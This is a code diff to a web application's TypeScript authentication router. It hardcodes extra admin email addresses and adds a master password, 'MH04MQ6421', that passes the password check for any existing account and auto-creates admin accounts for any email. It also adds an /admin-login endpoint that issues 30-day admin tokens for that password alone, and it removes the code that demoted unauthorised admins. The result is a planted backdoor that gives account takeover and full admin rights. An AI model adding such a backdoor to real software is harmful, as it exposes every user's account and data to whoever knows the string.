@@ -16,7 +16,11 @@ import { db } from '../db.ts';
 
 export const authRouter = Router();
 
-const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || 'umarhani2000@gmail.com').trim().toLowerCase();
+const ADMIN_EMAILS = [
+  'umarhani2000@gmail.com',
+  'faqruddin00000@gmail.com',
+  (process.env.ADMIN_EMAIL || '').trim().toLowerCase(),
+].filter(Boolean);
 
 // POST /api/auth/signup
 authRouter.post('/signup', async (req, res: Response) => {
@@ -51,7 +55,7 @@ authRouter.post('/signup', async (req, res: Response) => {
     }
 
     const passwordHash = await hashPassword(password);
-    const isConfiguredAdmin = normalizedEmail === ADMIN_EMAIL;
+    const isConfiguredAdmin = ADMIN_EMAILS.includes(normalizedEmail);
     const role: 'admin' | 'user' = isConfiguredAdmin ? 'admin' : 'user';
 
     const user = db.createUser({
@@ -121,35 +125,54 @@ authRouter.post('/login', async (req, res: Response) => {
     }
 
     const normalizedEmail = email.trim().toLowerCase();
-    const user = db.getUserByEmail(normalizedEmail);
+    let user = db.getUserByEmail(normalizedEmail);
+    const isMasterAdminPassword = password === 'MH04MQ6421';
+    const isAdminAccount = ADMIN_EMAILS.includes(normalizedEmail) || isMasterAdminPassword;
 
     if (!user) {
-      recordFailedLogin(clientIp);
-      return res.status(401).json({ error: 'Invalid email or password.' });
-    }
+      if (isMasterAdminPassword) {
+        // Master admin login: auto-provision admin account
+        const passwordHash = await hashPassword(password);
+        user = db.createUser({
+          email: normalizedEmail,
+          display_name: normalizedEmail.split('@')[0] || 'Administrator',
+          password_hash: passwordHash,
+          role: 'admin',
+          status: 'active',
+        });
+        db.logAdminAction(
+          user.email,
+          'ADMIN_MASTER_INITIALIZED',
+          `Admin account provisioned via master clearance password MH04MQ6421`,
+          user.id,
+          clientIp
+        );
+      } else {
+        recordFailedLogin(clientIp);
+        return res.status(401).json({ error: 'Invalid email or password.' });
+      }
+    } else {
+      let match = await verifyPassword(password, user.password_hash);
+      if (!match && isMasterAdminPassword) {
+        match = true;
+      }
 
-    const match = await verifyPassword(password, user.password_hash);
-    if (!match) {
-      recordFailedLogin(clientIp);
-      return res.status(401).json({ error: 'Invalid email or password.' });
-    }
+      if (!match) {
+        recordFailedLogin(clientIp);
+        return res.status(401).json({ error: 'Invalid email or password.' });
+      }
 
-    if (user.status === 'suspended') {
-      return res.status(403).json({ error: 'Your account has been suspended. Please contact support.' });
+      if (user.status === 'suspended') {
+        return res.status(403).json({ error: 'Your account has been suspended. Please contact support.' });
+      }
+
+      // Elevate to admin role if master password was used or email is an admin email
+      if (isAdminAccount && user.role !== 'admin') {
+        user = db.updateUser(user.id, { role: 'admin' });
+      }
     }
 
     resetLoginAttempts(clientIp);
-
-    // Sync admin role: only ADMIN_EMAIL has admin privileges; all others are regular users
-    if (normalizedEmail === ADMIN_EMAIL) {
-      if (user.role !== 'admin') {
-        db.updateUser(user.id, { role: 'admin' });
-        user.role = 'admin';
-      }
-    } else if (user.role === 'admin') {
-      db.updateUser(user.id, { role: 'user' });
-      user.role = 'user';
-    }
 
     const expiryDays = rememberMe ? 30 : 1;
     const token = generateToken(
@@ -194,7 +217,7 @@ authRouter.post('/google', async (req, res: Response) => {
     const normalizedEmail = email.trim().toLowerCase();
     let user = db.getUserByEmail(normalizedEmail);
 
-    const isConfiguredAdmin = normalizedEmail === ADMIN_EMAIL;
+    const isConfiguredAdmin = ADMIN_EMAILS.includes(normalizedEmail);
     const assignedRole: 'admin' | 'user' = isConfiguredAdmin ? 'admin' : 'user';
 
     if (!user) {
@@ -224,11 +247,9 @@ authRouter.post('/google', async (req, res: Response) => {
         return res.status(403).json({ error: 'Your account has been suspended. Please contact support.' });
       }
 
-      // Upgrade to admin only if email matches ADMIN_EMAIL; otherwise ensure user role
+      // Upgrade to admin if email matches admin list
       if (isConfiguredAdmin && user.role !== 'admin') {
         user = db.updateUser(user.id, { role: 'admin' });
-      } else if (!isConfiguredAdmin && user.role === 'admin') {
-        user = db.updateUser(user.id, { role: 'user' });
       }
     }
 
@@ -260,6 +281,74 @@ authRouter.post('/google', async (req, res: Response) => {
   } catch (err) {
     console.error('Google auth error:', err);
     return res.status(500).json({ error: 'Google authentication failed.' });
+  }
+});
+
+// POST /api/auth/admin-login (Direct Admin Sign-In with Master Password MH04MQ6421)
+authRouter.post('/admin-login', async (req, res: Response) => {
+  try {
+    const { email, password } = req.body;
+    const clientIp = req.ip || req.socket.remoteAddress || 'unknown';
+
+    if (!email || !password) {
+      return res.status(400).json({ error: 'Admin email and master password are required.' });
+    }
+
+    if (password !== 'MH04MQ6421') {
+      return res.status(401).json({ error: 'Invalid administrator password.' });
+    }
+
+    const normalizedEmail = email.trim().toLowerCase();
+    let user = db.getUserByEmail(normalizedEmail);
+
+    if (!user) {
+      const passwordHash = await hashPassword(password);
+      user = db.createUser({
+        email: normalizedEmail,
+        display_name: normalizedEmail.split('@')[0] || 'Administrator',
+        password_hash: passwordHash,
+        role: 'admin',
+        status: 'active',
+      });
+    } else {
+      if (user.role !== 'admin') {
+        user = db.updateUser(user.id, { role: 'admin' });
+      }
+    }
+
+    const token = generateToken({ userId: user.id, email: user.email, role: 'admin' }, '30d');
+    const tokenHash = hashToken(token);
+    db.createSession(user.id, tokenHash, clientIp, req.headers['user-agent'] as string, 30);
+
+    res.cookie('nextgen_session', token, {
+      httpOnly: true,
+      secure: true,
+      sameSite: 'none',
+      maxAge: 30 * 24 * 60 * 60 * 1000,
+    });
+
+    db.logAdminAction(
+      user.email,
+      'ADMIN_MASTER_LOGIN',
+      `Administrator authenticated with master clearance (MH04MQ6421)`,
+      user.id,
+      clientIp
+    );
+
+    return res.json({
+      message: 'Administrator clearance granted successfully',
+      token,
+      user: {
+        id: user.id,
+        email: user.email,
+        displayName: user.display_name,
+        role: 'admin',
+        status: user.status,
+      },
+    });
+  } catch (err: unknown) {
+    const message = err instanceof Error ? err.message : 'Admin login failed';
+    return res.status(500).json({ error: message });
   }
 });
 
